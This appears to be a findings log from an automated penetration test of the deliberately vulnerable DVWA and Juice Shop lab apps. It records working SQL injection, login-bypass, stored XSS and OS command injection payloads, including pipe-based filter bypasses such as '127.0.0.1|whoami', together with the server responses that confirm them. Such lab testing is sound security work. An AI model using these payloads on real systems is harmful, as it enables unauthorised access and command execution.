findings.title: DVWA SQL Injection in id parameter [security=low]
findings.response_evidence: [security=low] Security level confirmed as low. TRUE payload id=1' OR '1'='1 returned HTTP 200 with 5 records: "ID: 1' OR '1'='1 First name: admin Surname: admin", "First name: Gordon Surname: Brown", "First name: Hack Surname: Me", "First name: Pablo Surname: Picasso", "First name: Bob Surname: Smith". FALSE payload id=1' AND '1'='2 returned HTTP 200 with zero records (the 'User ID:' result area is empty, no First name/Surname rows). Boolean difference confirms SQL injection. DB: mysql.

findings.title: DVWA OS Command Injection in ip parameter [security=low]
request_sequence: POST http://dvwa/vulnerabilities/exec/ form ip='127.0.0.1; whoami', Submit=Submit (dvwa_admin)
findings.response_evidence: [security=low] HTTP 200. Ping output for 127.0.0.1 (4 packets, 0% loss) followed by the injected command output line "www-data" immediately before "More Information". The web-process identity www-data is present in the response, confirming command execution via the ';' separator.

findings.title: Juice Shop login authentication bypass via SQL injection in email field
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user admin@juice-sh.op using an unauthenticated session with an arbitrary password, confirming login SQL injection bypass.

findings.title: Stored XSS in guestbook message field [security=low]

findings.response_evidence: [security=low] POST sign returned 200 and stored the entry (guestbook shows 'Name: bench Message:' with the script element not rendered as text). Canary is exactly 50 chars, so it fits maxlength=50 (the coordinator's 47/52 counts were off). No user_token is present in this form. Guestbook cleared afterward via btnClear.

findings.title: Unauthenticated /api/Feedbacks returns feedback records with masked author emails (inconclusive PII)
findings.response_evidence: HTTP 200 application/json without auth, status success, 8 records with UserId, id, comment, rating, createdAt, updatedAt. Author emails appear only partially masked inside comments, e.g. "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)". No full email address and no email field. Anonymous entries show "(anonymous)" with UserId null. Unauthenticated access to records is confirmed; full email disclosure is NOT shown, so PII (CWE-359) is not confirmed. Recommend Coordinator decide whether masked-email leakage (local-part suffix and domain) is sufficient.

findings.title: DVWA security-level switch: changed from low to medium (cross-check, not a vulnerability by itself)

findings.response_evidence: [security=medium] Follow-up GET /security.php returned HTTP 200 with 'Security level is currently: medium.' and 'Security set to medium' / 'Security Level: medium' in the page footer. findings.title: [security=medium] SQL Injection (numeric boolean) in DVWA SQLi id parameter
findings.response_evidence: [security=medium] TRUE payload 'id=1 OR 1=1' -> HTTP 200 with 5 records: Surnames admin, Brown, Me, Picasso, Smith (First names admin, Gordon, Hack, Pablo, Bob). FALSE payload 'id=1 AND 1=2' -> HTTP 200 with 'User ID: 1 2 3 4 5' header only and ZERO 'First name/Surname' records. Behavioral difference confirmed: TRUE returns multiple seeded user surnames, FALSE returns none.

findings.title: [security=medium] OS Command Injection via pipe in DVWA exec ip parameter
findings.response_evidence: [security=medium] HTTP 200; ping output section reads 'Enter an IP address: www-data' (pre block contains exactly 'www-data'), confirming the injected 'whoami' executed as the web-process identity www-data. The pipe metacharacter bypassed the medium-level ';' and '&&' blacklist.

findings.title: [security=high] SQL Injection via session-input.php -> /vulnerabilities/sqli/ (id, quoted boolean with comment)
request_sequence: POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] -> 302; GET /security.php shows 'Security level is currently: high' and 'Security level set to high'
findings.response_evidence: [security=high] TRUE payload returned 5 records: 'ID: 1' OR '1'='1' # First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload (1' AND '1'='2' #) returned zero records (only 'Click here to change your ID' with no ID/Surname rows). Page showed 'Security Level: high'. Note: session_info metadata reported 'low' but the page itself displayed high; the level was explicitly set via security.php.

findings.title: [security=high] OS Command Injection via pipe without trailing space (ip=127.0.0.1|whoami)
request_sequence: POST http://dvwa/security.php security=high (level set to high, confirmed on page)
findings.response_evidence: [security=high] Response 200 'Vulnerability: Command Injection ... Ping a device Enter an IP address: www-data'. Output contains web-process identity 'www-data' after the blacklisted-free pipe payload 127.0.0.1|whoami (no space after pipe). Page displayed 'Security Level: high'.

findings.title: Unauthenticated User-Feedback PII Exposure via /api/Feedbacks (masked emails in comments)
findings.response_evidence: HTTP 200 without authentication, JSON {"status":"success","data":[...8 records...]}. Each record has UserId, id, comment, rating, createdAt, updatedAt; there is no email field. Author emails appear only as masked fragments embedded in comment text, e.g. id 1: "...(***in@juice-sh.op)", id 2: "(***@juice-sh.op)", id 3: "(***der@juice-sh.op)", id 4: "(***ereum@juice-sh.op)". Anonymous entries have UserId null and "(anonymous)". Full local parts are not disclosed. The endpoint is unauthenticated and linkable by UserId, and the domain plus partial local-part fragments are exposed. Because the criteria require disclosure of author email addresses and the emails are deliberately masked, this does not meet the confirmation bar. Recommend the Coordinator decide whether partial masked-email leakage counts as CWE-359, or whether /api/Users-level linkage should be tested separately.

findings.title: Unauthenticated GET /api/Feedbacks - user feedback exposure (emails masked only)
findings.response_evidence: HTTP 200, application/json, status=success, 8 records. Records return UserId, id, comment, rating, createdAt, updatedAt; there is no email field. Emails that appear are inside comment text and are masked: id1 comment "...(***in@juice-sh.op)" (UserId 1); id2 "(***@juice-sh.op)" (UserId 2); id3 "(***der@juice-sh.op)" (UserId 3); id4 "(***ereum@juice-sh.op)" (UserId 21). Remaining records have UserId null and "(anonymous)". No unmasked author email address is disclosed, so the CWE-359 PII condition is not met. Residual risk: partial local-parts (3-5 chars) of author emails are still disclosed, and UserId is exposed, which may be a lower-severity information leak, but this does not meet the confirmation criteria. One HTTP request used.

findings.title: Unauthenticated User-Feedback PII Exposure on GET /api/Feedbacks (masked emails only)
findings.response_evidence: [unauth, status 200, application/json] Returned 8 feedback records without authentication: {"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)","rating":5,...}, {"UserId":21,"id":4,"comment":"... (***ereum@juice-sh.op)",...}, anonymous entries have "UserId":null and "(anonymous)". No author email field is present in the records. The only email-like data is partially masked inside comment text (e.g. '***in@juice-sh.op', '***@juice-sh.op'), and the local part is truncated so the full address is not disclosed. Records do expose numeric UserId values, which link feedback to accounts. Criterion for confirmation (disclosure of author email addresses without auth) is not met by masked fragments alone; flagged for Coordinator review as a low-severity information exposure (unauthenticated access to user-linked feedback with partial email masking).

findings.title: Unauthenticated User-Feedback PII Exposure via /api/Feedbacks (masked author emails only)
findings.response_evidence: [unauth GET /api/Feedbacks -> 200 application/json, status=success, 8 records with keys UserId,id,comment,rating,createdAt,updatedAt. No email field exists in the records. Author emails appear only inside comment text, and only in masked form: e.g. id 1 "(***in@juice-sh.op)", id 2 "(***@juice-sh.op)", id 3 "(***der@juice-sh.op)", id 4 "(***ereum@juice-sh.op)". Remaining 4 records are anonymous (UserId null, comment ends "(anonymous)"). Unauth GET /api/Feedbacks/1 -> 401 credentials_required. Verdict rationale: the endpoint is unauthenticated and leaks numeric UserIds plus partial email local-parts and the domain, but the full author email addresses are not disclosed (deliberate *** masking). Strict criterion requires disclosure of author email addresses, which is not met; this is a partial/low-severity PII leak, so it is recorded as inconclusive rather than confirmed.]

findings.title: Unauthenticated User-Feedback PII Exposure via GET /api/Feedbacks (masked emails only)
findings.response_evidence: [1] Unauthenticated GET /api/Feedbacks -> HTTP 200, status=success, 8 records with keys UserId, id, comment, rating, createdAt, updatedAt. No email field exists. Comments embed only masked addresses: "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)"; anonymous entries show "(anonymous)" with UserId null. [2] GET /api/Feedbacks/1 unauth -> HTTP 401 credentials_required. Behavioral result: the list is readable without auth and leaks UserId values and partial (masked) email fragments/domain, but full author email addresses are NOT disclosed. Criteria require disclosure of author email addresses; masking is applied server-side, so the PII confirmation criterion is not met. Recommend Coordinator decide whether partial-mask leakage + unauthenticated list access counts as a low-severity CWE-359 finding.
